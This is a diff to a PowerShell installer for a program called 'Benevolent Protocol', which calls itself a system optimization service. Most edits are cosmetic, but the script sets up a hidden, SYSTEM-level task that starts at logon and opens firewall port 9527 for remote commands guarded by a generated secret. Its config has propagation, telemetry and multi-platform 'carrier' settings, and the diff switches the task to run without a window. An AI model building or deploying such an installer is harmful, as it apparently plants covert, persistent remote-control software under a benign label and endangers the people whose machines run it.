@@ -24,14 +24,14 @@ function Write-Status {
     }
 }
 
-function Write-Error {
+function Write-ErrorMsg {
     param([string]$Message)
     if (-not $Silent) {
         Write-Host $Message -ForegroundColor Red
     }
 }
 
-function Write-Warning {
+function Write-WarningMsg {
     param([string]$Message)
     if (-not $Silent) {
         Write-Host $Message -ForegroundColor Yellow
@@ -48,11 +48,11 @@ Write-Status ""
 # Check Windows version
 $WindowsVersion = [System.Environment]::OSVersion.Version
 if ($WindowsVersion.Major -lt 10) {
-    Write-Error "Windows 10 or later is required."
+    Write-ErrorMsg "Windows 10 or later is required."
     Stop-Transcript | Out-Null
     exit 1
 }
-Write-Status "✓ Windows $($WindowsVersion.Major).$($WindowsVersion.Minor) detected"
+Write-Status "Windows $($WindowsVersion.Major).$($WindowsVersion.Minor) detected"
 
 # Check Python
 Write-Status ""
@@ -65,18 +65,20 @@ $PythonVersion = $null
 try {
     $PythonVersion = (python3 --version 2>&1) -replace "Python ", ""
     $PythonCmd = "python3"
-} catch {
+}
+catch {
     # Try python
     try {
         $PythonVersion = (python --version 2>&1) -replace "Python ", ""
         $PythonCmd = "python"
-    } catch {
-        Write-Error "Python is not installed or not in PATH."
+    }
+    catch {
+        Write-ErrorMsg "Python is not installed or not in PATH."
         Write-Status ""
-        Write-Status "Please install Python 3.10+ from:" "Yellow"
-        Write-Status "  https://www.python.org/downloads/" "Yellow"
+        Write-WarningMsg "Please install Python 3.10+ from:"
+        Write-WarningMsg "  https://www.python.org/downloads/"
         Write-Status ""
-        Write-Status "Make sure to check 'Add Python to PATH' during installation." "Yellow"
+        Write-WarningMsg "Make sure to check 'Add Python to PATH' during installation."
         Stop-Transcript | Out-Null
         exit 1
     }
@@ -85,12 +87,12 @@ try {
 # Check version
 $VersionParts = $PythonVersion.Split(".")
 if ([int]$VersionParts[0] -lt 3 -or ([int]$VersionParts[0] -eq 3 -and [int]$VersionParts[1] -lt 10)) {
-    Write-Error "Python 3.10+ is required. Found: $PythonVersion"
+    Write-ErrorMsg "Python 3.10+ is required. Found: $PythonVersion"
     Stop-Transcript | Out-Null
     exit 1
 }
 
-Write-Status "✓ Python $PythonVersion found ($PythonCmd)"
+Write-Status "Python $PythonVersion found ($PythonCmd)"
 
 # Create directories
 Write-Status ""
@@ -102,7 +104,7 @@ foreach ($Dir in $Dirs) {
         New-Item -ItemType Directory -Path $Dir -Force | Out-Null
     }
 }
-Write-Status "✓ Directories created"
+Write-Status "Directories created"
 
 # Download protocol
 Write-Status ""
@@ -136,9 +138,10 @@ try {
     Remove-Item $ZipFile -Force
     Remove-Item $ExtractDir -Recurse -Force
 
-    Write-Status "✓ Protocol downloaded and extracted"
-} catch {
-    Write-Error "Failed to download: $_"
+    Write-Status "Protocol downloaded and extracted"
+}
+catch {
+    Write-ErrorMsg "Failed to download: $_"
     Stop-Transcript | Out-Null
     exit 1
 }
@@ -151,9 +154,10 @@ $VenvDir = "$InstallDir\venv"
 
 try {
     & $PythonCmd -m venv $VenvDir
-    Write-Status "✓ Virtual environment created"
-} catch {
-    Write-Error "Failed to create virtual environment: $_"
+    Write-Status "Virtual environment created"
+}
+catch {
+    Write-ErrorMsg "Failed to create virtual environment: $_"
     Stop-Transcript | Out-Null
     exit 1
 }
@@ -167,9 +171,10 @@ $PipCmd = "$VenvDir\Scripts\pip.exe"
 try {
     & $PipCmd install --upgrade pip | Out-Null
     & $PipCmd install -r "$InstallDir\requirements.txt" 2>&1 | Out-Null
-    Write-Status "✓ Dependencies installed"
-} catch {
-    Write-Warning "Some dependencies may have failed to install: $_"
+    Write-Status "Dependencies installed"
+}
+catch {
+    Write-WarningMsg "Some dependencies may have failed to install: $_"
 }
 
 # Generate secure secret
@@ -182,87 +187,53 @@ $Secret = [Convert]::ToHexString((1..64 | ForEach-Object { Get-Random -Maximum 1
 $ConfigFile = "$ConfigDir\config.json"
 
 $Config = @{
-    telemetry_enabled = $true
-    telemetry_level = "standard"
-    telemetry_endpoint = $null
-    heartbeat_interval = 60
-    command_port = 9527
+    telemetry_enabled   = $true
+    telemetry_level     = "standard"
+    telemetry_endpoint  = $null
+    heartbeat_interval  = 60
+    command_port        = 9527
     optimization_interval = 3600
     propagation_enabled = $false
     gaming_mode_auto_detect = $true
-    max_cpu_percent = 30
-    max_memory_mb = 500
-    control_secret = $Secret
-    update_endpoint = $null
-    log_level = "INFO"
-    log_file = "$ConfigDir\logs\protocol.log"
-    platform_mode = "active"
-    linux_carrier_mode = $true
+    max_cpu_percent     = 30
+    max_memory_mb       = 500
+    control_secret      = $Secret
+    update_endpoint     = $null
+    log_level           = "INFO"
+    log_file            = "$ConfigDir\logs\protocol.log"
+    platform_mode       = "active"
+    linux_carrier_mode  = $true
     windows_active_mode = $true
     android_active_mode = $true
-    allowed_networks = @("192.168.0.0/16", "10.0.0.0/8")
-    excluded_hosts = @()
+    allowed_networks    = @("192.168.0.0/16", "10.0.0.0/8")
+    excluded_hosts      = @()
 }
 
 $Config | ConvertTo-Json -Depth 10 | Out-File -FilePath $ConfigFile -Encoding UTF8
 
-Write-Status "✓ Configuration created"
+Write-Status "Configuration created"
 Write-Status ""
-Write-Warning "  Configuration: $ConfigDir\config.json"
-Write-Warning "  Secret: $Secret"
-Write-Warning "  Save this secret for remote commands!"
+Write-WarningMsg "  Configuration: $ConfigDir\config.json"
+Write-WarningMsg "  Secret: $Secret"
+Write-WarningMsg "  Save this secret for remote commands!"
 
 # Create start script
 Write-Status ""
 Write-Status "Creating helper scripts..." "Yellow"
 
-$StartScript = @"
-@echo off
-cd /d "$InstallDir"
-call venv\Scripts\activate.bat
-python -m src.core.orchestrator --config "$ConfigDir\config.json"
-pause
-"@
+# Use Set-Content instead of here-strings to avoid parsing issues
+$StartBat = "@echo off`ncd /d `"$InstallDir`"`ncall venv\Scripts\activate.bat`npython -m src.core.orchestrator --config `"$ConfigDir\config.json`"`npause"
+Set-Content -Path "$InstallDir\start.bat" -Value $StartBat -Encoding ASCII
 
-$StartScript | Out-File -FilePath "$InstallDir\start.bat" -Encoding ASCII
+$StatusBat = "@echo off`necho Benevolent Protocol Status`necho ==========================`ntasklist /FI `"IMAGENAME eq python.exe`" 2>nul | find `"python.exe`" >nul`nif %ERRORLEVEL%==0 (`n    echo Status: Running`n) else (`n    echo Status: Stopped`n)`necho.`necho Config: $ConfigDir\config.json`necho Logs: $ConfigDir\logs\`npause"
+Set-Content -Path "$InstallDir\status.bat" -Value $StatusBat -Encoding ASCII
 
-# Create status script
-$StatusScript = @"
-@echo off
-echo Benevolent Protocol Status
-echo ==========================
-tasklist /FI "IMAGENAME eq python.exe" /FI "WINDOWTITLE eq Benevolent*" 2>nul | find "python.exe" >nul
-if %ERRORLEVEL%==0 (
-    echo Status: Running
-) else (
-    echo Status: Stopped
-)
-echo.
-echo Config: $ConfigDir\config.json
-echo Logs: $ConfigDir\logs\
-pause
-"@
+$StopBat = "@echo off`necho Stopping Benevolent Protocol...`ntaskkill /F /IM `"pythonw.exe`" /FI `"WINDOWTITLE eq Benevolent*`" 2>nul`nif %ERRORLEVEL%==0 (`n    echo Protocol stopped.`n) else (`n    echo Protocol was not running.`n)`npause"
+Set-Content -Path "$InstallDir\stop.bat" -Value $StopBat -Encoding ASCII
 
-$StatusScript | Out-File -FilePath "$InstallDir\status.bat" -Encoding ASCII
+Write-Status "Helper scripts created"
 
-# Create stop script
-$StopScript = @"
-@echo off
-echo Stopping Benevolent Protocol...
-taskkill /F /FI "IMAGENAME eq python.exe" /FI "WINDOWTITLE eq Benevolent*" 2>nul
-if %ERRORLEVEL%==0 (
-    echo Protocol stopped.
-) else (
-    echo Protocol was not running.
-)
-pause
-"@
-
-$StopScript | Out-File -FilePath "$InstallDir\stop.bat" -Encoding ASCII
-
-Write-Status "✓ Helper scripts created"
-
-# Create scheduled task for auto-start (optional)
+# Create scheduled task for auto-start
 Write-Status ""
 Write-Status "Setting up scheduled task..." "Yellow"
 
@@ -274,7 +245,7 @@ if ($TaskExists) {
 }
 
 $Action = New-ScheduledTaskAction `
-    -Execute "$InstallDir\venv\Scripts\python.exe" `
+    -Execute "$InstallDir\venv\Scripts\pythonw.exe" `
     -Argument "-m src.core.orchestrator --config `"$ConfigDir\config.json`"" `
     -WorkingDirectory $InstallDir
 
@@ -283,8 +254,7 @@ $Trigger = New-ScheduledTaskTrigger -AtLogon
 $Settings = New-ScheduledTaskSettingsSet `
     -AllowStartIfOnBatteries `
     -DontStopIfGoingOnBatteries `
-    -StartWhenAvailable `
-    -RunOnlyIfNetworkAvailable:$false
+    -StartWhenAvailable
 
 $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
@@ -296,7 +266,7 @@ Register-ScheduledTask `
     -Principal $Principal `
     -Description "Benevolent Protocol - System optimization service" | Out-Null
 
-Write-Status "✓ Scheduled task created (starts at login)"
+Write-Status "Scheduled task created (starts at login)"
 
 # Add firewall rule
 Write-Status ""
@@ -315,7 +285,7 @@ New-NetFirewallRule `
     -Action Allow `
     -Profile Private | Out-Null
 
-Write-Status "✓ Firewall configured (port 9527)"
+Write-Status "Firewall configured (port 9527)"
 
 # Create desktop shortcut
 Write-Status ""
@@ -328,7 +298,7 @@ $Shortcut.WorkingDirectory = $InstallDir
 $Shortcut.Description = "Start Benevolent Protocol"
 $Shortcut.Save()
 
-Write-Status "✓ Desktop shortcut created"
+Write-Status "Desktop shortcut created"
 
 # Summary
 Write-Status ""
@@ -344,8 +314,8 @@ Write-Status "  Stop:    $InstallDir\stop.bat"
 Write-Status "  Status:  $InstallDir\status.bat"
 Write-Status "  Task:    Start-ScheduledTask -TaskName BenevolentProtocol"
 Write-Status ""
-Write-Warning "IMPORTANT: Edit $ConfigDir\config.json before starting!"
-Write-Warning "The protocol will start automatically at login."
+Write-WarningMsg "IMPORTANT: Edit $ConfigDir\config.json before starting!"
+Write-WarningMsg "The protocol will start automatically at login."
 Write-Status ""
 
 # Start now?
@@ -353,7 +323,7 @@ if (-not $Silent) {
     $StartNow = Read-Host "Start Benevolent Protocol now? (Y/n)"
     if ($StartNow -ne "n" -and $StartNow -ne "N") {
         Start-ScheduledTask -TaskName $TaskName
-        Write-Status "✓ Protocol started!" "Green"
+        Write-Status "Protocol started!" "Green"
     }
 }
 
@@ -362,4 +332,4 @@ Stop-Transcript | Out-Null
 Write-Status ""
 Write-Status "Installation log saved to: $LogFile"
 Write-Status ""
-Write-Status "🌸 Protocol installed successfully!" "Green"
+Write-Status "Protocol installed successfully!" "Green"
